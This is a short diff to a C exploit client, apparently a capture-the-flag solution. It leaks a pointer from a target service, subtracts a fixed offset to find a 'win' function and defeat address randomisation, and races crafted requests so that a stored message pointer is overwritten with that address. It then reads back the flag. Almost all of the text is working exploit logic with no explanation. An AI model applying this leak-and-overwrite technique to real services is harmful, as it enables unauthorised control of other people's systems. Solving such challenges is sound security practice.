@@ -1,6 +1,6 @@
 #include "request.h"
 
-#define OFFSET_TO_WIN (0x100008338 - 0x100000fd0)
+#define OFFSET_TO_WIN (0x100008330 - 0x100001380)
 
 uint64_t win = 0xAAAAAAAAAAAAAAAA;
 
@@ -38,9 +38,9 @@ int main()
     uint64_t pop_adr = strtoull(leak.response, NULL, 0);
     uint64_t win_adr = pop_adr - OFFSET_TO_WIN;
 
-    printf("OFF: %p\n", (void *)OFFSET_TO_WIN);
-    printf("POP: %p\n", (void *)pop_adr);
-    printf("WIN: %p\n", (void *)win_adr);
+    //printf("OFF: %p\n", (void *)OFFSET_TO_WIN);
+    //printf("POP: %p\n", (void *)pop_adr);
+    //printf("WIN: %p\n", (void *)win_adr);
 
     //close_request(&leak);
     //close_request(&add_country);
@@ -55,11 +55,11 @@ int main()
     write_feedback.message_length = 14;
 
     just_connect(&get_flag);
-    sleep(5);
     just_connect(&write_feedback);
-    sleep(1);
+
     update_request(&get_flag, 0x4000);
     sleep(5);
+
     update_request(&write_feedback, 0x100);
 
     write_feedback.message = &win_adr;
@@ -72,6 +72,8 @@ int main()
     get_flag.message_length = 4;
     update_request(&get_flag, 0x100);
     read_response(&get_flag);
+    read_response(&get_flag);
+    printf("%s\n", get_flag.response);
     close_request(&write_feedback);
     return 0;
 }
